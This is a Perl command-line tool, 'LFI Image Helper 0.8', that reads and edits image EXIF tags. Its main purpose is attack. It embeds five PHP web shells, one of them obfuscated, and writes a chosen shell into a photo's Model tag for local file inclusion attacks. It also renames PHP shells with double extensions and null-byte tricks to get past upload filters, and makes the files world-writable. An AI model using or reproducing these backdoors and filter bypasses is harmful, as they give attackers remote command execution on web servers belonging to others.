#!usr/bin/perl
#LFI Image Helper 0.8
#(C) Doddy Hackman 2015
#ppm install  http://trouchelle.com/ppm/Image-ExifTool.ppd
#
#Array @shells based on : OhNo - Evil Image Builder By Hood3dRob1n
#Thanks to Hood3dRob1n
#
#Dump Values
#Based on :http://www.nntp.perl.org/group/perl.beginners/2012/02/msg119913.html
#Thanks to Ken Slater
#
use Image::ExifTool;
use Getopt::Long;
use Color::Output;
Color::Output::Init;

my @shells = (

    {},

    {

        "nombre"  => "Simple Backdoor",
        "codigo"  => '<?php system($_GET["cmd"]);exit(1); ?>',
        "ejemplo" => "?cmd="

    },
    {

        "nombre" => "System Shell",
        "codigo" =>
'<?error_reporting(0);print(___);system($_REQUEST[cmd]);print(___);die;?>',
        "ejemplo" => "?cmd="

    },
    {

        "nombre" => "Eval Shell",
        "codigo" =>
'<?error_reporting(0);print(___);eval($_REQUEST[cmd]);print(___);die;?>',
        "ejemplo" => "?cmd="

    },
    {

        "nombre" => "Sneaky Shell",
        "codigo" =>
'<?php @$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_; $_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__]; $_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] ); $_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] ); $_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ]; $_=$ $_[$__+ $__] ;$_[@-_]($_[@!+_] );?>',
        "ejemplo" => "?0="

    },
    {

        "nombre" => "r0ng Shell",
        "codigo" =>
          '<?if($_GET["r0ng"]){echo"<pre>".shell_exec($_GET["r0ng"]);}?>',
        "ejemplo" => "?r0ng="

    }

);

GetOptions(
    "dump_all=s"   => \$dump_all,
    "dump_tags=s"  => \$dump_tags,
    "read_tag=s"   => \$read_tag,
    "tag=s"        => \$tag,
    "make_tag=s"   => \$make_tag,
    "value=s"      => \$value,
    "update_tag=s" => \$update_tag,
    "delete_tag=s" => \$delete_tag,
    "backdoor=s"   => \$backdoor,
    "bypass=s"     => \$bypass,
    "file=s"       => \$file
);

head();

if ($dump_all) {

    if ( -f $dump_all ) {
        printear_titulo("[+] Finding information in : ");
        print $dump_all. "\n\n";
        dump_all($dump_all);
    }
    else {
        printear("[-] File not found\n");
    }

}
elsif ($dump_tags) {

    if ( -f $dump_tags ) {
        printear_titulo("[+] Finding tags in : ");
        print $dump_tags. "\n\n";
        dump_tags($dump_tags);
    }
    else {
        printear("[-] File not found\n");
    }
}
elsif ($read_tag) {

    if ( -f $read_tag ) {
        printear_titulo("[+] Finding tag value of $tag in : ");
        print $read_tag. "\n\n";
        read_tag( $read_tag, $tag );
    }
    else {
        printear("[-] File not found\n");
    }

}

elsif ($make_tag) {

    if ( -f $make_tag ) {

        printear_titulo("[+] Photo : ");
        print $make_tag. "\n";
        printear_titulo("[+] Name : ");
        print $tag. "\n";
        printear_titulo("[+] Value : ");
        print $value. "\n\n";

        printear("[+] Making tag $tag ...\n\n");

        make_tag( $make_tag, $tag, $value );

    }
    else {
        printear("[-] File not found\n");
    }
}
elsif ($update_tag) {

    if ( -f $update_tag ) {

        printear_titulo("[+] Photo : ");
        print $update_tag. "\n";
        printear_titulo("[+] Name : ");
        print $tag. "\n";
        printear_titulo("[+] Value : ");
        print $value. "\n\n";

        printear("[+] Updating tag $tag ...\n\n");

        update_tag( $update_tag, $tag, $value );

    }
    else {
        printear("[-] File not found\n");
    }
}
elsif ($delete_tag) {

    if ( -f $delete_tag ) {
        printear_titulo("[+] Deleting tag $tag in : ");
        print $delete_tag. "\n\n";
        delete_tag( $delete_tag, $tag );
    }
    else {
        printear("[-] File not found\n");
    }

}
elsif ($backdoor) {

    if ( -f $backdoor ) {

        printear_titulo("[+] Photo : ");
        print $backdoor. "\n\n";

        printear("[+] 1 : ");
        print "Simple Backdoor\n";
        printear("[+] 2 : ");
        print "System Shell\n";
        printear("[+] 3 : ");
        print "Eval Shell\n";
        printear("[+] 4 : ");
        print "Sneaky Shell\n";
        printear("[+] 5 : ");
        print "r0ng Shell\n";

        printear_titulo("\n[+] Option : ");
        chomp( my $opcion = <stdin> );

        backdoor_tag( $backdoor, $opcion, $file );

    }
    else {
        printear("[-] File not found\n");
    }

}
elsif ($bypass) {

    if ( -f $bypass ) {

        my $source = readfile($bypass);

        printear_titulo("[+] PHP Shell : ");
        print $bypass. "\n\n";

        printear("[+] 1 : ");
        print "bypass.jpg.php\n";
        printear("[+] 2 : ");
        print "bypass.php;test.jpg\n";
        printear("[+] 3 : ");
        print "bypass.php%00.jpg\n";

        printear_titulo("\n[+] Option : ");
        chomp( my $opcion = <stdin> );

        if ( $opcion eq "1" ) {
            savefile( $file . ".jpg.php", $source );
            chmod 0777, $file . ".jpg.php";
        }
        elsif ( $opcion eq "2" ) {
            savefile( $file . ".php;test.jpg", $source );
            chmod 0777, $file . ".php;test.jpg";
        }
        elsif ( $opcion eq "3" ) {
            savefile( $file . ".php%00.jpg", $source );
            chmod 0777, $file . ".php%00.jpg";
        }
        else {
            savefile( $file . ".jpg.php", $source );
            chmod 0777, $file . ".jpg.php";
        }

        printear("\n[+] PHP Shell Bypassed\n");

    }
    else {
        printear("\n[-] File not found\n");
    }

}
else {
    sintax();
}

copyright();

# Functions

sub backdoor_tag {

    my $image  = $_[0];
    my $opcion = $_[1];
    my $final  = $_[2];

    my $tag     = "Model";
    my $nombre  = $shells[$opcion]->{nombre};
    my $valor   = $shells[$opcion]->{codigo};
    my $ejemplo = $shells[$opcion]->{ejemplo};

    printear("\n[+] Backdoor Name : ");
    print "$nombre\n";
    printear("[+] Backdoor Example : ");
    print "$ejemplo\n";

    my $datos_imagen       = new Image::ExifTool;
    my $informacion_imagen = $datos_imagen->ImageInfo($image);

    $datos_imagen->SetNewValue( $tag, $valor );

    unlink($final);

    $ok = $datos_imagen->WriteInfo( $image, $final );

    if ( $ok eq "1" ) {
        printear_titulo("\n[+] Backdoor : ");
        print "OK\n";
        chmod 0777, $final;
    }
    else {
        printear_titulo("\n[-] Backdoor: ");
        print "Error\n";
    }

}

sub delete_tag {

    my $imagen_target = $_[0];
    my $tag           = $_[1];

    my $datos_imagen       = new Image::ExifTool;
    my $informacion_imagen = $datos_imagen->ImageInfo($imagen_target);

    $datos_imagen->SetNewValue( $tag, undef );

    $ok = $datos_imagen->WriteInfo($imagen_target);

    if ( $ok eq "1" ) {
        printear_titulo("[+] Tag $tag : ");
        print "Deleted\n";
    }
    else {
        printear_titulo("[-] Tag $tag : ");
        print "Error\n";
    }

}

sub update_tag {

    my $image = $_[0];
    my $tag   = $_[1];
    my $valor = $_[2];

    my $datos_imagen       = new Image::ExifTool;
    my $informacion_imagen = $datos_imagen->ImageInfo($image);

    $datos_imagen->SetNewValue( $tag, $valor );

    $ok = $datos_imagen->WriteInfo($image);

    if ( $ok eq "1" ) {
        printear_titulo("[+] Tag $tag : ");
        print "Updated\n";
    }
    else {
        printear_titulo("[-] Tag $tag : ");
        print "Error\n";
    }

}

sub make_tag {

    my $image = $_[0];
    my $name  = $_[1];
    my $value = $_[2];

    my $poc = Image::ExifTool->new();

    $poc->ExtractInfo($image);
    $poc->SetNewValue( $name, $value );

    $ok = $poc->WriteInfo($image);

    if ( $ok eq "1" ) {
        printear_titulo("[+] Tag $name : ");
        print "Created\n";
    }
    else {
        printear_titulo("[-] Tag $name : ");
        print "Error\n";
    }

}

sub read_tag {

    $imagen_target = $_[0];
    $tag           = $_[1];

    my $datos_imagen       = new Image::ExifTool;
    my $informacion_imagen = $datos_imagen->ImageInfo($imagen_target);

    $valor = $datos_imagen->GetValue($tag);

    if ( $valor eq "" ) {
        printear("[-] Tag not found\n");
    }
    else {
        printear("[+] $tag : ");
        print $valor. "\n";
    }

}

sub dump_tags {

    my $imagen_target = $_[0];

    my $datos_imagen       = new Image::ExifTool;
    my $informacion_imagen = $datos_imagen->ImageInfo($imagen_target);

    @tags = $datos_imagen->GetFoundTags("File");

    for my $tag (@tags) {
        printear("[+] Tag : ");
        print $tag. "\n";
    }

}

sub dump_all {

    my $imagen_target = $_[0];

    my $datos_imagen       = new Image::ExifTool;
    my $informacion_imagen = $datos_imagen->ImageInfo($imagen_target);

    for my $abriendo_imagen ( $datos_imagen->GetFoundTags("Group0") ) {
        my $valor = $informacion_imagen->{$abriendo_imagen};
        printear("[+] $abriendo_imagen : ");
        print $valor. "\n";
    }

}

sub savefile {
    open( SAVE, ">>" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub readfile {
    open my $FILE, q[<], $_[0];
    my $word = join q[], <$FILE>;
    close $FILE;
    return $word;
}

sub printear {
    cprint( "\x036" . $_[0] . "\x030" );
}

sub printear_logo {
    cprint( "\x037" . $_[0] . "\x030" );
}

sub printear_titulo {
    cprint( "\x0310" . $_[0] . "\x030" );
}

sub sintax {

    printear("[+] Sintax : ");
    print "perl $0 <option> <value>\n";
    printear("\n[+] Options : \n\n");
    print "-dump_all <image> : Get all information of a image\n";
    print "-dump_tags <image> : Get all tags of a image\n";
    print "-read_tag <image> -tag <tag> : Read value tags of a image\n";
    print "-make_tag <image> -tag <tag> -value <value> : Make a new tag\n";
    print "-update_tag <image> -tag <tag> -value <value> : Update tag\n";
    print "-delete_tag <image> -tag <tag> : Delete tag\n";
    print "-backdoor <image> -file <name> : Insert backdoor in a image\n";
    print
"-bypass <php shell> -file <name> : Rename extension of a image to bypass\n";
    printear("\n[+] Example : ");
    print "perl lfi_image_helper.pl -dump_all test.jpg\n";
    copyright();
}

sub head {
    printear_logo("\n-- == LFI Image Helper 0.8 == --\n\n\n");
}

sub copyright {
    printear_logo("\n\n-- == (C) Doddy Hackman 2015 == --\n\n");
    exit(1);
}

sub toma {
    return $nave->get( $_[0] )->content;
}

#The End ?
